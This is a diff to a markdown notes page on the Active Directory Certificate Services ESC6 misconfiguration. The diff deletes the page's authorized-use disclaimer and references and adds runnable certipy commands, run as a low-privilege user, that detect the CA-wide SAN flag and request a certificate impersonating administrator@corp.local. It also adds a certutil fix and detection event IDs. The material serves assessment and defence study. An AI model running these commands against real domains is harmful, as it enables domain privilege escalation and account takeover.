@@ -10,21 +10,32 @@ mitre: "T1649"
 tag: null
 ---
 
+
 # AD CS ESC6 (CA-wide SAN policy)
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **CA registry flag `EDITF_ATTRIBUTESUBJECTALTNAME2`**.
 
-## Detection
+### Concept (deep)
+The flag makes **every template** accept a CSR-supplied SAN → any Client Auth template becomes ESC1-equivalent.
+
+### Commands
+```bash
+# ── Detect the flag ──────────────────────────────────────────────────
+certipy find -u lowpriv@corp.local -p 'Password123!' \
+  -dc-ip 10.10.10.5 -vulnerable -stdout
+# Output: "User Specified SAN: Enabled"
+
+# ── Exploit any template ─────────────────────────────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template User -upn administrator@corp.local
+
+# ── Fix (clear the flag) ─────────────────────────────────────────────
+certutil -config "CORP-CA\dc01" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+# Restart CertSvc.
+```
+
+### Detection
 CA registry change (**4657**) + restart of `CertSvc`; **4886** SAN mismatch.
 
 ---
-
-## References
-
-- [Microsoft: Active Directory Certificate Services overview](https://learn.microsoft.com/windows-server/identity/ad-cs/active-directory-certificate-services-overview)
-- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)
